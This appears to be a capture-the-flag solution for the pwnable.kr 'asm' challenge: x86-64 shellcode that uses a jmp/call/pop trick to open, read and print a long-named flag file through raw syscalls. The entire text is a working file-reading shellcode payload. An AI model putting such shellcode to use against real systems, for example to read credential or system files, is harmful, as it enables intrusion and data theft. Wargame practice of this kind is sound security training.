global _start

section .text
_start:
# Open
	mov	rax, 2;
	mov	rsi, 0;	# Flags 0 = O_RDONLY
	mov	rdx, 0; 
	jmp path
jump_back:
	pop rdi;
	syscall;
	
# Read
	mov	rdi, rax;
	sub	rsp, 100;
	xor	rax, rax;
	mov	rsi, rsp;
	mov	rdx, 100;
	syscall;

# Write
	mov	rdx, rax;
	mov	rax, 1
	mov	rdi, 1
	mov	rsi, rsp
	syscall

# Exit
	mov	rax, 60;
	xor	rdi, rdi;
	syscall;

path:
	call jump_back	
	db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0;
